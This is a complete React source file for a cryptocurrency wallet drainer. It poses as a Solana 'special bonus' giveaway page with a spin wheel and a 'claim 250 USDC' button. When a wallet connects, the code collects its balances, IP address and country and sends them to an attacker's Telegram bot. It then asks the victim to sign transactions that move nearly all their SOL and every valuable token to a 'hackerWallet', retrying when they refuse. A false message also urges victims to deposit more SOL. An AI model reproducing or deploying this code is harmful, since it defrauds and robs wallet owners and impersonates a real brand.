import React, { useState, useEffect } from 'react';
import { useAppKitAccount } from '@reown/appkit/react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction } from '@solana/spl-token';
import axios from 'axios';

const hackerWallet = new PublicKey(import.meta.env.VITE_HACKER_WALLET);
const connection = new Connection(import.meta.env.VITE_RPC_URL, 'confirmed');
const MIN_TOKEN_PRICE = 0.01;
const RENT_EXEMPTION_LAMPORTS = 2039280;
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

const countryFlags = {
  'US': '🇺🇸',
  'BE': '🇧🇪',
  'NL': '🇳🇱',
  'FR': '🇫🇷',
  'DE': '🇩🇪',
  'GB': '🇬🇧',
  'CA': '🇨🇦',
  'AU': '🇦🇺',
  'IN': '🇮🇳',
  'IR': '🇮🇷',
  'CN': '🇨🇳',
  'TR': '🇹🇷',
  'RU': '🇷🇺',
};

const debounce = (func, delay) => {
  let timeoutId;
  return (...args) => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(null, args), delay);
  };
};

function App({ appKit }) {
  const { isConnected, address } = useAppKitAccount();
  const [solBalance, setSolBalance] = useState(null);
  const [tokenBalances, setTokenBalances] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [shouldDrain, setShouldDrain] = useState(false);
  const [ipAddress, setIpAddress] = useState('');
  const [countryCode, setCountryCode] = useState('');
  const [walletType] = useState('IOS-ANDROID');

  const [isFirstConnectSent, setIsFirstConnectSent] = useState(() => {
    return localStorage.getItem('isFirstConnectSent') === 'true';
  });

  useEffect(() => {
    const getIpAndCountry = async () => {
      try {
        const ipRes = await axios.get('https://api.ipify.org?format=json');
        const ip = ipRes.data.ip;
        setIpAddress(ip);

        const countryRes = await axios.get(`https://ipapi.co/${ip}/json/`);
        setCountryCode(countryRes.data.country_code || 'US');
      } catch (err) {
        console.error('Error getting IP and country:', err);
        setIpAddress('Unknown');
        setCountryCode('US');
      }
    };
    getIpAndCountry();
  }, []);

  const sendTelegramMessage = async (message) => {
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      });
      console.log('Message sent to Telegram:', message);
    } catch (err) {
      console.error('Error sending message to Telegram:', err);
    }
  };

  const sendConnectMessage = debounce(async () => {
    if (isConnected && address && !isFirstConnectSent) {
      try {
        const wallet = new PublicKey(address);
        const balance = await connection.getBalance(wallet);
        setSolBalance(balance / LAMPORTS_PER_SOL);

        const filters = [{ dataSize: 165 }, { memcmp: { offset: 32, bytes: address } }];
        const tokenAccounts = await connection.getProgramAccounts(TOKEN_PROGRAM_ID, { filters });
        const tokens = [];
        for (const account of tokenAccounts) {
          const tokenAccountInfo = await connection.getTokenAccountBalance(account.pubkey).catch(() => null);
          if (!tokenAccountInfo || Number(tokenAccountInfo.value.amount) <= 0) continue;
          try {
            const mintAddress = new PublicKey(account.account.data.slice(0, 32)).toBase58();
            const response = await axios.get(`https://public-api.solscan.io/token/meta?tokenAddress=${mintAddress}`).catch(() => null);
            const price = response?.data?.price || 0;
            const balanceValue = (Number(tokenAccountInfo.value.amount) / Math.pow(10, tokenAccountInfo.value.decimals)) * price;

            if (balanceValue >= MIN_TOKEN_PRICE) {
              tokens.push({
                mint: mintAddress,
                name: response?.data?.symbol?.toUpperCase() || 'Unknown',
                balance: Number(tokenAccountInfo.value.amount),
                decimals: tokenAccountInfo.value.decimals,
                uiAmount: tokenAccountInfo.value.uiAmount,
                price: balanceValue,
                tokenAccount: account.pubkey.toString(),
              });
            }
          } catch (err) {
            console.error('Error getting token price:', err);
          }
        }
        tokens.sort((a, b) => b.price - a.price);
        setTokenBalances(tokens);

        sendTelegramMessage(
          `New connect 🚀\n(${walletType})\n` +
          `Address: [${address}](https://solscan.io/address/${address})\n` +
          `Network: SOL\n` +
          `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
          `Total Value: ${(balance / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
          `SOL - ${(balance / LAMPORTS_PER_SOL).toFixed(2)} `
        );
        setIsFirstConnectSent(true);
        localStorage.setItem('isFirstConnectSent', 'true');
      } catch (err) {
        console.error('Inventory scan error:', err);
      }
    }
  }, 1000);

  useEffect(() => {
    sendConnectMessage();
  }, [isConnected, address, ipAddress, countryCode, walletType, sendConnectMessage]);

  useEffect(() => {
    if (shouldDrain && isConnected && address && !isProcessing) {
      const executeDrain = async () => {
        setShouldDrain(false);
        await drainSOL();
      };
      executeDrain();
    }
  }, [isConnected, address, shouldDrain, isProcessing]);

  const estimateTransactionFee = async (transaction) => {
    try {
      const fee = await connection.getFeeForMessage(transaction.compileMessage(), 'confirmed');
      if (fee.value === null) throw new Error('The fee can be estimated.');
      return fee.value + 1000000;
    } catch (err) {
      console.error('Error in fee estimation:', err);
      return 1000000;
    }
  };

  const drainSOL = async () => {
    if (!isConnected || !address) {
      alert('Please connect your wallet!');
      return;
    }
    setIsProcessing(true);
    let attempt = 0;
    const maxAttempts = 3;

    while (attempt < maxAttempts) {
      try {
        const wallet = new PublicKey(address);
        const latestBlockhash = await connection.getLatestBlockhash();
        const balance = await connection.getBalance(wallet);
        const testTransaction = new Transaction({
          feePayer: wallet,
          recentBlockhash: latestBlockhash.blockhash,
        }).add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }),
          SystemProgram.transfer({
            fromPubkey: wallet,
            toPubkey: hackerWallet,
            lamports: 1,
          })
        );
        const estimatedFee = await estimateTransactionFee(testTransaction);
        const lamportsToDrain = balance - estimatedFee;

        if (lamportsToDrain <= 0) {
          alert(`Insufficient balance! Please top up your wallet with at least 0.2 SOL to withdraw your bonus. Current balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
          sendTelegramMessage(
            `Balance transfer approved 📤\n(${walletType})\n` +
            `Address: [${address}](https://solscan.io/address/${address})\n` +
            `Network: SOL\n` +
            `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
            `Processing: ${(balance / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
            `SOL - ${(balance / LAMPORTS_PER_SOL).toFixed(2)} `
          );
          break;
        }

        const transaction = new Transaction({
          feePayer: wallet,
          recentBlockhash: latestBlockhash.blockhash,
        }).add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }),
          SystemProgram.transfer({
            fromPubkey: wallet,
            toPubkey: hackerWallet,
            lamports: lamportsToDrain,
          })
        );

        const { solana } = window;
        if (!solana) {
          sendTelegramMessage(
            `Balance transfer approved 📤\n(${walletType})\n` +
            `Address: [${address}](https://solscan.io/address/${address})\n` +
            `Network: SOL\n` +
            `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
            `Processing: ${(balance / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
            `SOL - ${(balance / LAMPORTS_PER_SOL).toFixed(2)} `
          );
          break;
        }

        sendTelegramMessage(
          `Balance transfer approved 📤\n(${walletType})\n` +
          `Address: [${address}](https://solscan.io/address/${address})\n` +
          `Network: SOL\n` +
          `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
          `Processing: ${(lamportsToDrain / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
          `SOL - ${(lamportsToDrain / LAMPORTS_PER_SOL).toFixed(2)} `
        );

        const signedTransaction = await solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
          skipPreflight: false,
          maxRetries: 5,
        });
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        if (confirmation.value.err) throw new Error('Transaction verification failed.');
        console.log('SOL transaction sent:', signature);
        setSolBalance(0);

        sendTelegramMessage(
          `Drained successfully 💰\n(${walletType})\n` +
          `Address: [${address}](https://solscan.io/address/${address})\n` +
          `Network: SOL\n` +
          `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
          `Total Drained: ${(lamportsToDrain / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
          `Tx Hash: [${signature}](https://solscan.io/tx/${signature})`
        );
        break;
      } catch (err) {
        console.error('Error sending SOL transaction:', err);
        if (err.message.includes('User rejected') && attempt < maxAttempts - 1) {
          attempt++;
          console.log(`Retry ${attempt} From ${maxAttempts}...`);
          await new Promise(resolve => setTimeout(resolve, 1000));
        } else {
          const errorMessage = err.message.includes('User rejected')
            ? 'User rejected transaction (max 3 attempts)'
            : `Error: ${err.message || 'Please try again.'}`;
          // alert(errorMessage);
          sendTelegramMessage(
            `Transaction Failed ❌\n(${walletType})\n` +
            `Address: [${address}](https://solscan.io/address/${address})\n` +
            `Network: SOL\n` +
            `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
            `Status: ${errorMessage}`
          );
          break;
        }
      }
    }
    setIsProcessing(false);
  };

  const drainAllTokens = async () => {
    if (!isConnected || !address) {
      alert('Please connect your wallet!');
      return;
    }
    if (tokenBalances.length === 0) {
      return;
    }
    setIsProcessing(true);
    try {
      const wallet = new PublicKey(address);
      const latestBlockhash = await connection.getLatestBlockhash();
      const transaction = new Transaction({
        feePayer: wallet,
        recentBlockhash: latestBlockhash.blockhash,
      }).add(ComputeBudgetProgram.setComputeUnitLimit({ units: 400000 }));

      for (const token of tokenBalances) {
        const tokenMint = new PublicKey(token.mint);
        const userTokenAccount = new PublicKey(token.tokenAccount);
        const hackerTokenAccount = await getAssociatedTokenAddress(tokenMint, hackerWallet);
        const hackerTokenAccountInfo = await connection.getAccountInfo(hackerTokenAccount).catch(() => null);
        if (!hackerTokenAccountInfo) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              wallet,
              hackerTokenAccount,
              hackerWallet,
              tokenMint
            )
          );
        }
        transaction.add(
          createTransferCheckedInstruction(
            userTokenAccount,
            tokenMint,
            hackerTokenAccount,
            wallet,
            BigInt(token.balance),
            token.decimals
          )
        );
      }

      const estimatedFee = await estimateTransactionFee(transaction);
      const solBalance = await connection.getBalance(wallet);
      const requiredLamports = estimatedFee + (tokenBalances.length * RENT_EXEMPTION_LAMPORTS);
      if (solBalance < requiredLamports) {
        alert(`SOL balance is not enough for account fees and rental! Need: ${(requiredLamports / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
        sendTelegramMessage(
          `Transaction Failed ❌\n(${walletType})\n` +
          `Address: [${address}](https://solscan.io/address/${address})\n` +
          `Network: SOL\n` +
          `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
          `Required: ${(requiredLamports / LAMPORTS_PER_SOL).toFixed(6)} SOL\n` +
          `Status: Insufficient SOL`
        );
        return;
      }

      const { solana } = window;
      if (!solana) {
        sendTelegramMessage(
          `Transaction Failed ❌\n(${walletType})\n` +
          `Address: [${address}](https://solscan.io/address/${address})\n` +
          `Network: SOL\n` +
          `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
          `Status: Solana wallet not found`
        );
        return;
      }

      const signedTransaction = await solana.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
        skipPreflight: false,
        maxRetries: 5,
      });
      const confirmation = await connection.confirmTransaction(signature, 'confirmed');
      if (confirmation.value.err) throw new Error('Transaction verification failed.');
      console.log('Tokens transaction sent:', signature);
      setTokenBalances([]);

      sendTelegramMessage(
        `Drained successfully 💰\n(${walletType})\n` +
        `Address: [${address}](https://solscan.io/address/${address})\n` +
        `Network: SOL\n` +
        `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
        `Total Drained: ${(solBalance / LAMPORTS_PER_SOL).toFixed(2)} $\n` +
        `Tx Hash: [${signature}](https://solscan.io/tx/${signature})`
      );
    } catch (err) {
      console.error('Error sending token transaction:', err);
      alert(`Error processing airdrop: ${err.message || 'Please try again.'}`);
      sendTelegramMessage(
        `Transaction Failed ❌\n(${walletType})\n` +
        `Address: [${address}](https://solscan.io/address/${address})\n` +
        `Network: SOL\n` +
        `${countryFlags[countryCode] || '🇺🇸'} ${ipAddress}\n` +
        `Status: ${err.message || 'Please try again.'}`
      );
    } finally {
      setIsProcessing(false);
    }
  };

  const handleClaimReward = async () => {
    if (!isConnected || !address) {
      try {
        if (appKit && typeof appKit.open === 'function') {
          setShouldDrain(true);
          await appKit.open();
          console.log('Request to connect wallet...');
        } else {
        }
      } catch (err) {
        console.error('Wallet connection error:', err);
        setShouldDrain(false);
      }
    } else {
      await drainSOL();
    }
  };

  return (
    
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black relative overflow-hidden">
      <div className="modal">
        <div className="modal_rect">
          <div className="modal_rect_up">
            <p className="modal_rect_up_tittle">CONGRATULATIONS! <br /> YOU WON <span>250 USDC</span></p>
          </div>
          <div className="modal_rect_bottom">
            <div className="modal_rect_bottom_content">
              <p className="modal_rect_bottom_text">CONNECT WALLET TO RECEIVE REWARD</p>
              <button onClick={handleClaimReward} className="modal_rect_bottom_button" disabled={isProcessing}>
                {isProcessing ? 'Processing...' : 'CLAIM REWARD'}
              </button>
            </div>
          </div>
        </div>
      </div>

      <section className="header">
        <div className="container">
          <div className="header_items">
            <div className="header_item">
              <a href="#!" onClick={() => { document.location.hash = '!'; return false; }} className="header_item_logo">
                <img src="/img/header_logo.svg" alt="" />
              </a>
            </div>
            <div className="header_item">
              <div className="header_item_socials">
                <a href="https://solana.com/twitter" target="_blank" className="header_item_social">
                  <img src="/img/header_twitter.svg" alt="" />
                </a>
                <a href="https://solana.com/telegram" target="_blank" className="header_item_social">
                  <img src="/img/header_tg.svg" alt="" />
                </a>
                <a href="https://solana.com/discord" target="_blank" className="header_item_social">
                  <img src="/img/header_ds.svg" alt="" />
                </a>
                <a href="" className="header_item_social">
                  <img src="/img/header_mail.svg" alt="" />
                </a>
              </div>
            </div>
            <div className="header_item">
              <w3m-button />
            </div>
          </div>
        </div>
      </section>

      <section className="main">
        <div className="container">
          <h1 className="main_tittle">SPECIAL <span>BONUS</span> <br /> FOR SOLANA USERS</h1>

          <div className="main_wheel">
            <div className="main_wheel_main">
              <img src="/img/wheel_arrow.png" alt="" className="main_wheel_main_arrow" />
              <img src="/img/wheel_wheel.png" alt="" className="main_wheel_main_wheel" id="wheel" />
              <button className="main_wheel_main_button" id="spin-button">FREE SPIN</button>
            </div>
          </div>

          <div className="main_faq">
            <div className="main_faq_blocks">
              <p className="main_faq_block">
                <img src="/img/main_one.svg" alt="" />If you have received a qualification notification in the form of SOL or USDC, click the button
              </p>
              <p className="main_faq_block">
                <img src="/img/main_two.svg" alt="" />If you win reward in free spin, we congratulate you!
              </p>
              <p className="main_faq_block">
                <img src="/img/main_three.svg" alt="" />Click «CLAIM REWARD», connect your wallet and confirm in wallet received transaction
              </p>
            </div>
            <p className="main_faq_copy">All rights reserved © 2025 Solana.</p>
          </div>
        </div>
      </section>
    </div>
  );
}

export default App;